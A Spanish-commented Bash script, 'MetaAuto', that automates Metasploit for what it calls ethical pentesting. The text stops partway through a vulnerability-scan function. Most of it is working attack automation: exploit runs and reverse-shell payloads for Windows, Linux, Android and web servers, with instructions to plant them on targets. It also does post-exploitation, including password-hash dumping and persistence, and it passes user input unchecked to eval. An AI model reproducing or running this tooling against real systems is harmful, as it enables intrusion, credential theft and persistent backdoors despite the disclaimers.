#!/bin/bash

# MetaAuto - Herramienta de Automatización para Pentesting Ético con Metasploit
# Versión: 2.0
# Uso: Pentesting ético y autorizado

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Variables globales
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="$SCRIPT_DIR/logs"
RESULTS_DIR="$SCRIPT_DIR/results"
CONFIG_FILE="$SCRIPT_DIR/metaauto.conf"
SESSION_FILE="$SCRIPT_DIR/.session"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOGFILE="$LOG_DIR/metaauto_$TIMESTAMP.log"

# Crear directorios necesarios
mkdir -p "$LOG_DIR" "$RESULTS_DIR"

# Función de logging
log() {
    local level=$1
    shift
    local message="$*"
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    echo "[$timestamp] [$level] $message" >> "$LOGFILE"
    
    case $level in
        "ERROR") echo -e "${RED}[ERROR]${NC} $message" ;;
        "WARN")  echo -e "${YELLOW}[WARN]${NC} $message" ;;
        "INFO")  echo -e "${BLUE}[INFO]${NC} $message" ;;
        "SUCCESS") echo -e "${GREEN}[SUCCESS]${NC} $message" ;;
        "CRITICAL") echo -e "${MAGENTA}[CRITICAL]${NC} $message" ;;
    esac
}

# Banner de la aplicación
show_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
    ███╗   ███╗███████╗████████╗ █████╗  █████╗ ██╗   ██╗████████╗ ██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗
    ██╔████╔██║█████╗     ██║   ███████║███████║██║   ██║   ██║   ██║   ██║
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║██╔══██║██║   ██║   ██║   ██║   ██║
    ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║██║  ██║╚██████╔╝   ██║   ╚██████╔╝
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ 
                                                                            
    Herramienta de Automatización Metasploit v2.0
    Para Pentesting Ético y Uso Académico
    Zyanetralys
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}Advertencia: Esta herramienta es solo para uso ético y autorizado${NC}"
    echo -e "${RED}El mal uso de esta herramienta puede ser ilegal${NC}"
    echo ""
}

# Verificar dependencias
check_dependencies() {
    log "INFO" "Verificando dependencias..."
    
    local deps=("msfconsole" "nmap" "searchsploit" "nc" "curl" "jq")
    local missing_deps=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing_deps+=("$dep")
        fi
    done
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        log "ERROR" "Dependencias faltantes: ${missing_deps[*]}"
        echo -e "${RED}Instala las dependencias faltantes antes de continuar${NC}"
        exit 1
    fi
    
    log "SUCCESS" "Todas las dependencias están disponibles"
}

# Configuración inicial
initialize_config() {
    if [ ! -f "$CONFIG_FILE" ]; then
        log "INFO" "Creando archivo de configuración..."
        cat > "$CONFIG_FILE" << EOF
# Configuración MetaAuto
LHOST=$(ip route get 1.1.1.1 | awk '{print $7}' | head -n1)
LPORT=4444
RHOST=
RPORT=
WORKSPACE=default
THREADS=10
TIMEOUT=30
VERBOSE=false
STEALTH_MODE=false
EOF
        log "SUCCESS" "Archivo de configuración creado en $CONFIG_FILE"
    fi
    source "$CONFIG_FILE"
}

# Cargar configuración
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
        log "INFO" "Configuración cargada desde $CONFIG_FILE"
    else
        log "WARN" "Archivo de configuración no encontrado, usando valores por defecto"
        initialize_config
    fi
}

# Guardar configuración
save_config() {
    cat > "$CONFIG_FILE" << EOF
# Configuración MetaAuto
LHOST=$LHOST
LPORT=$LPORT
RHOST=$RHOST
RPORT=$RPORT
WORKSPACE=$WORKSPACE
THREADS=$THREADS
TIMEOUT=$TIMEOUT
VERBOSE=$VERBOSE
STEALTH_MODE=$STEALTH_MODE
EOF
    log "SUCCESS" "Configuración guardada en $CONFIG_FILE"
}

# Menú de configuración
config_menu() {
    while true; do
        clear
        show_banner
        echo -e "${CYAN}=== CONFIGURACIÓN ===${NC}"
        echo "1. Ver configuración actual"
        echo "2. Establecer LHOST (IP local): $LHOST"
        echo "3. Establecer LPORT (Puerto local): $LPORT"
        echo "4. Establecer RHOST (IP objetivo): $RHOST"
        echo "5. Establecer RPORT (Puerto objetivo): $RPORT"
        echo "6. Establecer Workspace: $WORKSPACE"
        echo "7. Configurar hilos de escaneo: $THREADS"
        echo "8. Timeout de conexión: $TIMEOUT"
        echo "9. Modo verbose: $VERBOSE"
        echo "10. Modo sigiloso: $STEALTH_MODE"
        echo "11. Guardar configuración"
        echo "0. Volver al menú principal"
        
        read -p "Selecciona una opción: " choice
        
        case $choice in
            1) show_current_config ;;
            2) read -p "Introduce LHOST: " LHOST ;;
            3) read -p "Introduce LPORT: " LPORT ;;
            4) read -p "Introduce RHOST: " RHOST ;;
            5) read -p "Introduce RPORT: " RPORT ;;
            6) read -p "Introduce Workspace: " WORKSPACE ;;
            7) read -p "Introduce número de hilos: " THREADS ;;
            8) read -p "Introduce timeout (segundos): " TIMEOUT ;;
            9) toggle_verbose ;;
            10) toggle_stealth ;;
            11) save_config ;;
            0) break ;;
            *) log "ERROR" "Opción inválida" ;;
        esac
    done
}

# Mostrar configuración actual
show_current_config() {
    echo -e "${GREEN}Configuración actual:${NC}"
    echo "LHOST: $LHOST"
    echo "LPORT: $LPORT"
    echo "RHOST: $RHOST"
    echo "RPORT: $RPORT"
    echo "WORKSPACE: $WORKSPACE"
    echo "THREADS: $THREADS"
    echo "TIMEOUT: $TIMEOUT"
    echo "VERBOSE: $VERBOSE"
    echo "STEALTH_MODE: $STEALTH_MODE"
    read -p "Presiona Enter para continuar..."
}

# Toggle verbose mode
toggle_verbose() {
    if [ "$VERBOSE" = "true" ]; then
        VERBOSE="false"
    else
        VERBOSE="true"
    fi
    log "INFO" "Modo verbose: $VERBOSE"
}

# Toggle stealth mode
toggle_stealth() {
    if [ "$STEALTH_MODE" = "true" ]; then
        STEALTH_MODE="false"
    else
        STEALTH_MODE="true"
    fi
    log "INFO" "Modo sigiloso: $STEALTH_MODE"
}

# Validar objetivo
validate_target() {
    if [ -z "$RHOST" ]; then
        log "ERROR" "No se ha especificado un objetivo (RHOST)"
        read -p "Introduce la IP objetivo: " RHOST
        save_config
    fi
    
    # Verificar si el objetivo es accesible
    log "INFO" "Verificando accesibilidad del objetivo $RHOST..."
    if ping -c 1 -W 3 "$RHOST" &>/dev/null; then
        log "SUCCESS" "Objetivo accesible"
        return 0
    else
        log "WARN" "El objetivo no responde a ping, continuando..."
        return 1
    fi
}

# Escaneo de reconocimiento
reconnaissance_scan() {
    validate_target || return 1
    
    log "INFO" "Iniciando escaneo de reconocimiento en $RHOST"
    local scan_file="$RESULTS_DIR/recon_${RHOST}_$TIMESTAMP.xml"
    
    local nmap_opts="-sS -sV -O -A --script vuln"
    if [ "$STEALTH_MODE" = "true" ]; then
        nmap_opts="-sS -T2 -f"
        log "INFO" "Modo sigiloso activado"
    fi
    
    echo -e "${YELLOW}Ejecutando nmap con opciones: $nmap_opts${NC}"
    nmap $nmap_opts -oX "$scan_file" "$RHOST" | tee "$RESULTS_DIR/recon_${RHOST}_$TIMESTAMP.txt"
    
    if [ $? -eq 0 ]; then
        log "SUCCESS" "Escaneo completado. Resultados en: $scan_file"
        parse_nmap_results "$scan_file"
    else
        log "ERROR" "Error durante el escaneo de reconocimiento"
    fi
}

# Parsear resultados de nmap
parse_nmap_results() {
    local xml_file="$1"
    local parsed_file="$RESULTS_DIR/parsed_$(basename "$xml_file" .xml).txt"
    
    log "INFO" "Parseando resultados de nmap..."
    
    # Extraer puertos abiertos
    echo "=== PUERTOS ABIERTOS ===" > "$parsed_file"
    grep -E "portid|service name" "$xml_file" | grep -B1 "open" >> "$parsed_file"
    
    # Extraer vulnerabilidades
    echo -e "\n=== VULNERABILIDADES DETECTADAS ===" >> "$parsed_file"
    grep -E "script.*vuln" "$xml_file" >> "$parsed_file"
    
    log "SUCCESS" "Resultados parseados en: $parsed_file"
}

# Búsqueda de exploits
search_exploits() {
    if [ -z "$RHOST" ]; then
        log "ERROR" "No se ha especificado un objetivo"
        return 1
    fi
    
    read -p "Introduce el servicio/software a buscar (ej: apache 2.4): " service
    if [ -z "$service" ]; then
        log "ERROR" "Debes especificar un servicio"
        return 1
    fi
    
    log "INFO" "Buscando exploits para: $service"
    
    # Buscar con searchsploit
    echo -e "${YELLOW}Buscando con searchsploit...${NC}"
    searchsploit "$service" | tee "$RESULTS_DIR/searchsploit_${service}_$TIMESTAMP.txt"
    
    # Buscar módulos en Metasploit
    echo -e "${YELLOW}Buscando módulos en Metasploit...${NC}"
    msfconsole -q -x "search $service; exit" | tee "$RESULTS_DIR/msf_search_${service}_$TIMESTAMP.txt"
    
    log "SUCCESS" "Búsqueda de exploits completada"
}

# Ejecutar exploit automático
auto_exploit() {
    validate_target || return 1
    
    read -p "Introduce el módulo de exploit (ej: exploit/linux/http/apache_mod_cgi_bash_env_exec): " exploit_module
    if [ -z "$exploit_module" ]; then
        log "ERROR" "Debes especificar un módulo de exploit"
        return 1
    fi
    
    log "INFO" "Configurando exploit automático: $exploit_module"
    
    local rc_file="$RESULTS_DIR/auto_exploit_$TIMESTAMP.rc"
    
    # Crear archivo resource para Metasploit
    cat > "$rc_file" << EOF
use $exploit_module
set RHOSTS $RHOST
set LHOST $LHOST
set LPORT $LPORT
EOF
    
    # Agregar RPORT si está especificado
    if [ -n "$RPORT" ]; then
        echo "set RPORT $RPORT" >> "$rc_file"
    fi
    
    # Configurar payload
    read -p "Introduce el payload (Enter para automático): " payload
    if [ -n "$payload" ]; then
        echo "set PAYLOAD $payload" >> "$rc_file"
    fi
    
    cat >> "$rc_file" << EOF
show options
exploit -j
sessions -l
EOF
    
    log "INFO" "Ejecutando exploit con Metasploit..."
    msfconsole -r "$rc_file" | tee "$RESULTS_DIR/exploit_output_$TIMESTAMP.txt"
    
    log "SUCCESS" "Exploit ejecutado. Revisa los resultados en: $RESULTS_DIR/exploit_output_$TIMESTAMP.txt"
}

# Gestión de sesiones
session_management() {
    echo -e "${CYAN}=== GESTIÓN DE SESIONES ===${NC}"
    echo "1. Listar sesiones activas"
    echo "2. Interactuar con sesión"
    echo "3. Ejecutar comando en sesión"
    echo "4. Upgrade de shell"
    echo "5. Matar sesión"
    echo "0. Volver"
    
    read -p "Selecciona una opción: " choice
    
    case $choice in
        1) list_sessions ;;
        2) interact_session ;;
        3) execute_command_session ;;
        4) upgrade_shell ;;
        5) kill_session ;;
        0) return ;;
        *) log "ERROR" "Opción inválida" ;;
    esac
}

# Listar sesiones
list_sessions() {
    log "INFO" "Listando sesiones activas..."
    msfconsole -q -x "sessions -l; exit"
}

# Interactuar con sesión
interact_session() {
    read -p "Introduce el ID de la sesión: " session_id
    if [ -z "$session_id" ]; then
        log "ERROR" "Debes especificar un ID de sesión"
        return 1
    fi
    
    log "INFO" "Interactuando con sesión $session_id"
    msfconsole -q -x "sessions -i $session_id"
}

# Ejecutar comando en sesión
execute_command_session() {
    read -p "Introduce el ID de la sesión: " session_id
    read -p "Introduce el comando a ejecutar: " command
    
    if [ -z "$session_id" ] || [ -z "$command" ]; then
        log "ERROR" "Debes especificar sesión y comando"
        return 1
    fi
    
    log "INFO" "Ejecutando '$command' en sesión $session_id"
    msfconsole -q -x "sessions -c '$command' -i $session_id; exit"
}

# Upgrade de shell
upgrade_shell() {
    read -p "Introduce el ID de la sesión: " session_id
    if [ -z "$session_id" ]; then
        log "ERROR" "Debes especificar un ID de sesión"
        return 1
    fi
    
    log "INFO" "Upgrading shell en sesión $session_id"
    local rc_file="$RESULTS_DIR/upgrade_shell_$TIMESTAMP.rc"
    
    cat > "$rc_file" << EOF
sessions -i $session_id
background
use post/multi/manage/shell_to_meterpreter
set SESSION $session_id
set LHOST $LHOST
set LPORT $((LPORT + 1))
run
sessions -l
EOF
    
    msfconsole -r "$rc_file"
}

# Post-explotación automática
post_exploitation() {
    read -p "Introduce el ID de la sesión: " session_id
    if [ -z "$session_id" ]; then
        log "ERROR" "Debes especificar un ID de sesión"
        return 1
    fi
    
    log "INFO" "Iniciando post-explotación automática en sesión $session_id"
    
    local rc_file="$RESULTS_DIR/post_exploit_$TIMESTAMP.rc"
    
    cat > "$rc_file" << EOF
sessions -i $session_id
background
# Recopilar información del sistema
use post/multi/gather/env
set SESSION $session_id
run

use post/windows/gather/enum_system
set SESSION $session_id
run

use post/linux/gather/enum_system
set SESSION $session_id
run

# Buscar archivos interesantes
use post/multi/gather/find_files
set SESSION $session_id
set PATTERN *.txt,*.doc,*.pdf,*.xls
run

# Dump de hashes
use post/windows/gather/hashdump
set SESSION $session_id
run

# Persistencia
use exploit/windows/local/persistence
set SESSION $session_id
set STARTUP SYSTEM
run

sessions -l
EOF
    
    msfconsole -r "$rc_file" | tee "$RESULTS_DIR/post_exploit_output_$TIMESTAMP.txt"
    
    log "SUCCESS" "Post-explotación completada"
}

# Generar payloads
generate_payload() {
    echo -e "${CYAN}=== GENERADOR DE PAYLOADS ===${NC}"
    echo "1. Windows Reverse Shell"
    echo "2. Linux Reverse Shell"
    echo "3. Android APK"
    echo "4. Web Payload (PHP/ASP/JSP)"
    echo "5. Payload personalizado"
    echo "0. Volver"
    
    read -p "Selecciona tipo de payload: " payload_type
    
    case $payload_type in
        1) generate_windows_payload ;;
        2) generate_linux_payload ;;
        3) generate_android_payload ;;
        4) generate_web_payload ;;
        5) generate_custom_payload ;;
        0) return ;;
        *) log "ERROR" "Opción inválida" ;;
    esac
}

# Generar payload Windows
generate_windows_payload() {
    local output_file="$RESULTS_DIR/windows_payload_$TIMESTAMP.exe"
    
    log "INFO" "Generando payload Windows..."
    
    msfvenom -p windows/meterpreter/reverse_tcp \
        LHOST="$LHOST" \
        LPORT="$LPORT" \
        -f exe \
        -o "$output_file"
    
    if [ $? -eq 0 ]; then
        log "SUCCESS" "Payload Windows generado: $output_file"
        echo -e "${GREEN}Para usar el payload:${NC}"
        echo "1. Transfiere el archivo al objetivo"
        echo "2. Configura el handler: use exploit/multi/handler"
        echo "3. set payload windows/meterpreter/reverse_tcp"
        echo "4. set LHOST $LHOST && set LPORT $LPORT && exploit"
    else
        log "ERROR" "Error generando payload Windows"
    fi
}

# Generar payload Linux
generate_linux_payload() {
    local output_file="$RESULTS_DIR/linux_payload_$TIMESTAMP.elf"
    
    log "INFO" "Generando payload Linux..."
    
    msfvenom -p linux/x86/meterpreter/reverse_tcp \
        LHOST="$LHOST" \
        LPORT="$LPORT" \
        -f elf \
        -o "$output_file"
    
    if [ $? -eq 0 ]; then
        chmod +x "$output_file"
        log "SUCCESS" "Payload Linux generado: $output_file"
    else
        log "ERROR" "Error generando payload Linux"
    fi
}

# Configurar handler automático
setup_handler() {
    read -p "Introduce el tipo de payload (windows/linux/android/web): " payload_type
    
    local handler_file="$RESULTS_DIR/handler_$TIMESTAMP.rc"
    local payload=""
    
    case $payload_type in
        windows) payload="windows/meterpreter/reverse_tcp" ;;
        linux) payload="linux/x86/meterpreter/reverse_tcp" ;;
        android) payload="android/meterpreter/reverse_tcp" ;;
        web) payload="php/meterpreter/reverse_tcp" ;;
        *) 
            read -p "Introduce el payload personalizado: " payload
            ;;
    esac
    
    cat > "$handler_file" << EOF
use exploit/multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
    
    log "INFO" "Configurando handler para $payload"
    msfconsole -r "$handler_file"
}

# Reportes automáticos
generate_report() {
    local report_file="$RESULTS_DIR/pentest_report_$TIMESTAMP.html"
    
    log "INFO" "Generando reporte de pentesting..."
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Reporte de Pentesting - $(date)</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background-color: #2c3e50; color: white; padding: 20px; }
        .section { margin: 20px 0; padding: 15px; border-left: 4px solid #3498db; }
        .vulnerability { background-color: #e74c3c; color: white; padding: 10px; margin: 5px 0; }
        .success { background-color: #27ae60; color: white; padding: 10px; margin: 5px 0; }
        .info { background-color: #f39c12; color: white; padding: 10px; margin: 5px 0; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Reporte de Pentesting Ético</h1>
        <p>Generado por MetaAuto el $(date)</p>
        <p>Objetivo: $RHOST</p>
    </div>
    
    <div class="section">
        <h2>Resumen Ejecutivo</h2>
        <p>Este reporte contiene los resultados del pentesting ético realizado con fines académicos.</p>
    </div>
    
    <div class="section">
        <h2>Configuración Utilizada</h2>
        <ul>
            <li><strong>LHOST:</strong> $LHOST</li>
            <li><strong>LPORT:</strong> $LPORT</li>
            <li><strong>RHOST:</strong> $RHOST</li>
            <li><strong>WORKSPACE:</strong> $WORKSPACE</li>
            <li><strong>Timestamp:</strong> $TIMESTAMP</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Archivos Generados</h2>
        <ul>
EOF
    
    # Listar archivos generados
    find "$RESULTS_DIR" -name "*$TIMESTAMP*" -type f | while read file; do
        echo "            <li>$(basename "$file")</li>" >> "$report_file"
    done
    
    cat >> "$report_file" << EOF
        </ul>
    </div>
    
    <div class="section">
        <h2>Logs de Sesión</h2>
        <pre>$(tail -n 50 "$LOGFILE")</pre>
    </div>
    
    <div class="section">
        <h2>Recomendaciones</h2>
        <div class="info">
            <strong>Nota:</strong> Este es un reporte generado automáticamente. 
            Revisa manualmente todos los resultados y archivos generados para 
            un análisis completo de seguridad.
        </div>
    </div>
    
    <div class="section">
        <h2>Disclaimer</h2>
        <div class="vulnerability">
            <strong>IMPORTANTE:</strong> Esta herramienta y este reporte son para uso 
            exclusivamente ético y educativo. El pentesting debe realizarse únicamente 
            en sistemas propios o con autorización explícita por escrito.
        </div>
    </div>
</body>
</html>
EOF
    
    log "SUCCESS" "Reporte HTML generado: $report_file"
    
    # Intentar abrir el reporte en el navegador
    if command -v xdg-open &> /dev/null; then
        xdg-open "$report_file" 2>/dev/null &
    fi
}

# Limpiar archivos temporales
cleanup() {
    log "INFO" "Limpiando archivos temporales..."
    find "$RESULTS_DIR" -name "*.tmp" -delete 2>/dev/null
    find "$LOG_DIR" -name "*.log" -mtime +7 -delete 2>/dev/null
    log "SUCCESS" "Limpieza completada"
}

# Función de ayuda
show_help() {
    echo -e "${CYAN}=== AYUDA - MetaAuto ===${NC}"
    cat << EOF

DESCRIPCIÓN:
MetaAuto es una herramienta de automatización para pentesting ético 
usando Metasploit Framework. Está diseñada para uso académico y profesional.

CARACTERÍSTICAS:
- Automatización de reconocimiento y exploits
- Generación de payloads
- Gestión de sesiones de Metasploit
- Post-explotación automatizada
- Generación de reportes
- Configuración persistente

USO TÍPICO:
1. Configurar objetivos y parámetros
2. Ejecutar reconocimiento
3. Buscar y ejecutar exploits
4. Gestionar sesiones obtenidas
5. Realizar post-explotación
6. Generar reportes

ARCHIVOS:
- Configuración: $CONFIG_FILE
- Logs: $LOG_DIR/
- Resultados: $RESULTS_DIR/

ÉTICA Y LEGALIDAD:
Esta herramienta debe usarse únicamente para:
- Pentesting autorizado
- Investigación académica
- Sistemas propios
- Entornos de laboratorio

DISCLAIMER:
El uso no autorizado puede ser ilegal. El usuario es responsable 
del uso ético y legal de esta herramienta.

EOF
    read -p "Presiona Enter para continuar..."
}

# Menú principal
main_menu() {
    while true; do
        clear
        show_banner
        echo -e "${CYAN}=== MENÚ PRINCIPAL ===${NC}"
        echo "1.  Configuración"
        echo "2.  Reconocimiento y escaneo"
        echo "3.  Búsqueda de exploits"
        echo "4.  Ejecutar exploit automático"
        echo "5.  Gestión de sesiones"
        echo "6.  Post-explotación automática"
        echo "7.  Generador de payloads"
        echo "8.  Configurar handler"
        echo "9.  Generar reporte"
        echo "10. Limpiar archivos temporales"
        echo "11. Ver logs"
        echo "12. Ayuda"
        echo "0.  Salir"
        
        echo ""
        echo -e "${YELLOW}Objetivo actual: ${RHOST:-'No configurado'}${NC}"
        echo -e "${YELLOW}Workspace: $WORKSPACE${NC}"
        
        read -p "Selecciona una opción: " choice
        
        case $choice in
            1) config_menu ;;
            2) reconnaissance_scan ;;
            3) search_exploits ;;
            4) auto_exploit ;;
            5) session_management ;;
            6) post_exploitation ;;
            7) generate_payload ;;
            8) setup_handler ;;
            9) generate_report ;;
            10) cleanup ;;
            11) view_logs ;;
            12) show_help ;;
            0) 
                log "INFO" "Saliendo de MetaAuto..."
                cleanup
                echo -e "${GREEN}¡Gracias por usar MetaAuto!${NC}"
                exit 0
                ;;
            *) log "ERROR" "Opción inválida" ;;
        esac
        
        if [ "$choice" != "1" ] && [ "$choice" != "12" ]; then
            read -p "Presiona Enter para continuar..."
        fi
    done
}

# Ver logs
view_logs() {
    echo -e "${CYAN}=== ÚLTIMOS LOGS ===${NC}"
    if [ -f "$LOGFILE" ]; then
        tail -n 30 "$LOGFILE"
    else
        log "WARN" "No hay archivo de log disponible"
    fi
}

# Generar payload Android
generate_android_payload() {
    local output_file="$RESULTS_DIR/android_payload_$TIMESTAMP.apk"
    
    log "INFO" "Generando payload Android..."
    
    msfvenom -p android/meterpreter/reverse_tcp \
        LHOST="$LHOST" \
        LPORT="$LPORT" \
        -o "$output_file"
    
    if [ $? -eq 0 ]; then
        log "SUCCESS" "Payload Android generado: $output_file"
        echo -e "${YELLOW}NOTA: El APK debe ser instalado manualmente en el dispositivo objetivo${NC}"
    else
        log "ERROR" "Error generando payload Android"
    fi
}

# Generar payload web
generate_web_payload() {
    echo "Selecciona el tipo de payload web:"
    echo "1. PHP"
    echo "2. ASP"
    echo "3. JSP"
    echo "4. WAR"
    
    read -p "Opción: " web_type
    
    case $web_type in
        1) generate_php_payload ;;
        2) generate_asp_payload ;;
        3) generate_jsp_payload ;;
        4) generate_war_payload ;;
        *) log "ERROR" "Opción inválida" ;;
    esac
}

# Generar payload PHP
generate_php_payload() {
    local output_file="$RESULTS_DIR/web_payload_$TIMESTAMP.php"
    
    log "INFO" "Generando payload PHP..."
    
    msfvenom -p php/meterpreter/reverse_tcp \
        LHOST="$LHOST" \
        LPORT="$LPORT" \
        -f raw \
        -o "$output_file"
    
    if [ $? -eq 0 ]; then
        log "SUCCESS" "Payload PHP generado: $output_file"
        echo -e "${GREEN}Sube el archivo PHP al servidor web objetivo${NC}"
    else
        log "ERROR" "Error generando payload PHP"
    fi
}

# Generar payload ASP
generate_asp_payload() {
    local output_file="$RESULTS_DIR/web_payload_$TIMESTAMP.asp"
    
    log "INFO" "Generando payload ASP..."
    
    msfvenom -p windows/meterpreter/reverse_tcp \
        LHOST="$LHOST" \
        LPORT="$LPORT" \
        -f asp \
        -o "$output_file"
    
    if [ $? -eq 0 ]; then
        log "SUCCESS" "Payload ASP generado: $output_file"
    else
        log "ERROR" "Error generando payload ASP"
    fi
}

# Generar payload JSP
generate_jsp_payload() {
    local output_file="$RESULTS_DIR/web_payload_$TIMESTAMP.jsp"
    
    log "INFO" "Generando payload JSP..."
    
    msfvenom -p java/meterpreter/reverse_tcp \
        LHOST="$LHOST" \
        LPORT="$LPORT" \
        -f jsp \
        -o "$output_file"
    
    if [ $? -eq 0 ]; then
        log "SUCCESS" "Payload JSP generado: $output_file"
    else
        log "ERROR" "Error generando payload JSP"
    fi
}

# Generar payload WAR
generate_war_payload() {
    local output_file="$RESULTS_DIR/web_payload_$TIMESTAMP.war"
    
    log "INFO" "Generando payload WAR..."
    
    msfvenom -p java/meterpreter/reverse_tcp \
        LHOST="$LHOST" \
        LPORT="$LPORT" \
        -f war \
        -o "$output_file"
    
    if [ $? -eq 0 ]; then
        log "SUCCESS" "Payload WAR generado: $output_file"
        echo -e "${GREEN}Despliega el archivo WAR en el servidor de aplicaciones${NC}"
    else
        log "ERROR" "Error generando payload WAR"
    fi
}

# Generar payload personalizado
generate_custom_payload() {
    echo "Configuración de payload personalizado:"
    read -p "Payload (ej: windows/meterpreter/reverse_tcp): " custom_payload
    read -p "Formato de salida (exe/elf/raw/php/asp/jsp): " custom_format
    read -p "Arquitectura (x86/x64) [opcional]: " custom_arch
    read -p "Encoder [opcional]: " custom_encoder
    read -p "Iteraciones de encoding [opcional]: " custom_iterations
    
    if [ -z "$custom_payload" ] || [ -z "$custom_format" ]; then
        log "ERROR" "Payload y formato son obligatorios"
        return 1
    fi
    
    local output_file="$RESULTS_DIR/custom_payload_$TIMESTAMP.$custom_format"
    local msfvenom_cmd="msfvenom -p $custom_payload LHOST=$LHOST LPORT=$LPORT"
    
    # Agregar parámetros opcionales
    [ -n "$custom_arch" ] && msfvenom_cmd="$msfvenom_cmd -a $custom_arch"
    [ -n "$custom_encoder" ] && msfvenom_cmd="$msfvenom_cmd -e $custom_encoder"
    [ -n "$custom_iterations" ] && msfvenom_cmd="$msfvenom_cmd -i $custom_iterations"
    
    msfvenom_cmd="$msfvenom_cmd -f $custom_format -o $output_file"
    
    log "INFO" "Ejecutando: $msfvenom_cmd"
    eval "$msfvenom_cmd"
    
    if [ $? -eq 0 ]; then
        log "SUCCESS" "Payload personalizado generado: $output_file"
    else
        log "ERROR" "Error generando payload personalizado"
    fi
}

# Matar sesión específica
kill_session() {
    read -p "Introduce el ID de la sesión a terminar: " session_id
    if [ -z "$session_id" ]; then
        log "ERROR" "Debes especificar un ID de sesión"
        return 1
    fi
    
    log "INFO" "Terminando sesión $session_id"
    msfconsole -q -x "sessions -k $session_id; exit"
    
    if [ $? -eq 0 ]; then
        log "SUCCESS" "Sesión $session_id terminada"
    else
        log "ERROR" "Error terminando sesión $session_id"
    fi
}

# Backup de configuración y resultados
backup_data() {
    local backup_dir="$SCRIPT_DIR/backups"
    local backup_file="$backup_dir/metaauto_backup_$TIMESTAMP.tar.gz"
    
    mkdir -p "$backup_dir"
    
    log "INFO" "Creando backup de datos..."
    
    tar -czf "$backup_file" \
        -C "$SCRIPT_DIR" \
        logs/ results/ metaauto.conf 2>/dev/null
    
    if [ $? -eq 0 ]; then
        log "SUCCESS" "Backup creado: $backup_file"
    else
        log "ERROR" "Error creando backup"
    fi
}

# Restaurar backup
restore_backup() {
    local backup_dir="$SCRIPT_DIR/backups"
    
    if [ ! -d "$backup_dir" ]; then
        log "ERROR" "No hay backups disponibles"
        return 1
    fi
    
    echo "Backups disponibles:"
    ls -la "$backup_dir"/*.tar.gz 2>/dev/null | nl
    
    read -p "Introduce el número del backup a restaurar: " backup_num
    local backup_file=$(ls "$backup_dir"/*.tar.gz 2>/dev/null | sed -n "${backup_num}p")
    
    if [ -z "$backup_file" ]; then
        log "ERROR" "Backup no válido"
        return 1
    fi
    
    log "INFO" "Restaurando backup: $backup_file"
    tar -xzf "$backup_file" -C "$SCRIPT_DIR"
    
    if [ $? -eq 0 ]; then
        log "SUCCESS" "Backup restaurado exitosamente"
        load_config
    else
        log "ERROR" "Error restaurando backup"
    fi
}

# Escaneo de vulnerabilidades específicas
vulnerability_scan() {
    validate_target || return 1
    
    echo -e "${CYAN}=== ESCANEO DE VULNERABILIDADES ===${NC}"
    echo "1. EternalBlue (MS17-010)"
    echo "2. BlueKeep (CVE-2019-0708)"
    echo "3. Shellshock (CVE-2014-6271)"
    echo "4. Heartbleed (CVE-2014-0160)"
    echo "5. SMB vulnerabilities"
    echo "6. Web vulnerabilities"
    echo "7. Escaneo personalizado"
    echo "0. Volver"
    
    read -p "Selecciona tipo de escaneo: " vuln_type
    
    case $vuln_type in
        1) scan_eternalblue ;;
        2) scan_bluekeep ;;
        3) scan_shellshock ;;
        4) scan_heartbleed ;;
        5) scan_smb_vulns ;;
        6) scan_web_vulns ;;
        7) custom_vuln_scan ;;
        0) return ;;
        *) log "ERROR" "Opción inválida" ;;
    esac
}

# Escaneo EternalBlue
scan_eternalblue() {
    log "INFO" "Escaneando EternalBlue (MS17-010) en $RHOST"
    
    local rc_file="$RESULTS_DIR/eternalblue_scan_$TIMESTAMP.rc"
    
    cat > "$rc_file" << EOF
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS $RHOST
set THREADS $THREADS
run
exit
EOF
    
    msfconsole -r "$rc_file" | tee "$RESULTS_DIR/eternalblue_results_$TIMESTAMP.txt"
    log "SUCCESS" "Escaneo EternalBlue completado"
}

# Escaneo BlueKeep
scan_bluekeep() {
    log "INFO" "Escaneando BlueKeep (CVE-2019-0708) en $RHOST"
    
    local rc_file="$RESULTS_DIR/bluekeep_scan_$TIMESTAMP.rc"
    
    cat > "$rc_file" << EOF
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS $RHOST
set THREADS $THREADS
run
exit
EOF
    
    msfconsole -r "$rc_file" | tee "$RESULTS_DIR/bluekeep_results_$TIMESTAMP.txt"
    log "SUCCESS" "Escaneo BlueKeep completado"
}

# Escaneo Shellshock
scan_shellshock() {
    log "INFO" "Escaneando Shellshock (CVE-2014-6271) en $RHOST"
    
    # Usar nmap script para detectar shellshock
    nmap -sV -p 80,443,8080,8443 --script http-shellshock \
        --script-args uri=/cgi-bin/test.cgi \
        "$RHOST" | tee "$RESULTS_DIR/shellshock_results_$TIMESTAMP.txt"
    
    log "SUCCESS" "Escaneo Shellshock completado"
}

# Escaneo Heartbleed
scan_heartbleed() {
    log "INFO" "Escaneando Heartbleed (CVE-2014-0160) en $RHOST"
    
    nmap -sV -p 443,465,993,995 --script ssl-heartbleed \
        "$RHOST" | tee "$RESULTS_DIR/heartbleed_results_$TIMESTAMP.txt"
